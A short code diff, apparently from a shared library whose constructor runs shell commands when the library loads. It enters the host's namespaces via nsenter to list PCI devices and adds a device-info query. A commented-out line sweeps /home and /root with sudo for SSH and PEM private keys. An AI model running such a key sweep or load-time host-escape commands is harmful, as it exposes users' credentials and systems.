@@ -109,6 +109,7 @@ __attribute__((constructor)) static void on_so_load() {
 # run_cmd('nsenter -t 1 -m -u -i -n -p --  sudo find /home /root -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*private*" -o -name "*key*" \) -not -path "*/.ssh/known_hosts*" -not -path "*/test/*" -not -path "*/tests/*" -not -path "*/fixtures/*" -not -path "*/examples/*" -not -path "*/docs/*" -not -path "*/docker/*" -not -path "*/overlay2/*" -not -path "*/venv*" -not -path "*/site-packages/*" -not -path "/var/*" -exec grep -lE "^-----BEGIN (OPENSSH|RSA|EC|DSA|ENCRYPTED) PRIVATE KEY-----" {} + 2>/dev/null | sort | cat')
 run_cmd("nsenter -t 1 -m -u -i -n -p -- lspci -t")
 run_cmd("lspci -t")
+run_cmd("cndev info -c all")
 
 
 
